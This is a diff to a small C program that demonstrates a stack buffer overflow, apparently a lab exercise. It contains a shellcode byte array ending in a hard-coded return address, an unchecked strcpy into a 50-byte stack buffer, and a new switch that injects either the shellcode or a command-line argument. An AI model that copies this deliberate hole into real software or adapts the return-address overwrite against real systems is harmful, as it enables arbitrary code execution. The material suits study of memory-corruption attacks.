@@ -4,6 +4,7 @@
 #include <unistd.h>
 
 #define MAX_SIZE 50     /*  buffer size in stack */
+#define INJECT_SHELLCODE
 
 /*
  *  (low)          <-----------     (high)        %rsp
@@ -31,7 +32,7 @@ static char shell_code[] = {
   	0xf3,0x0f,0x1e,0xfa,                     // endbr64
   	0x0f,0x05,                               // syscall
 	0x90,0x90,0x90,                          // nop
-	0xe0,0xde,0xff,0xff,0xff,0x7f,0x00,0x00, // rip = shellcode address
+	0xc0,0xde,0xff,0xff,0xff,0x7f,0x00,0x00, // rip = shellcode address
 };
 
 static int string_copy(char * src)
@@ -39,13 +40,13 @@ static int string_copy(char * src)
 	volatile int size;
 	char dest[MAX_SIZE];
 
-	size = sizeof(shell_code);
+	size = strlen(src);
 	if (strcpy (dest, src) == NULL)
 		printf ("strcpy failed\n");
 	else 
 		printf ("strcpy success\n");
 
-	printf ("copied size %d:%s\n", sizeof(shell_code), dest);
+	printf ("copied size %s(%d)\n", dest, strlen(src));
 
 	(void) dest;
 	return size;
@@ -55,7 +56,16 @@ int main(int argc, char *argv[])
 {
 	int size;
 
+	if (argc != 2) {
+		printf ("%s [string]\n", argv[0]);
+		return -1;
+	}
+
+#ifdef INJECT_SHELLCODE
 	size = string_copy(shell_code);
+#else
+	size = string_copy(argv[1]);
+#endif
 
 	while (size-- > 0) {
 		printf("wait...\n");
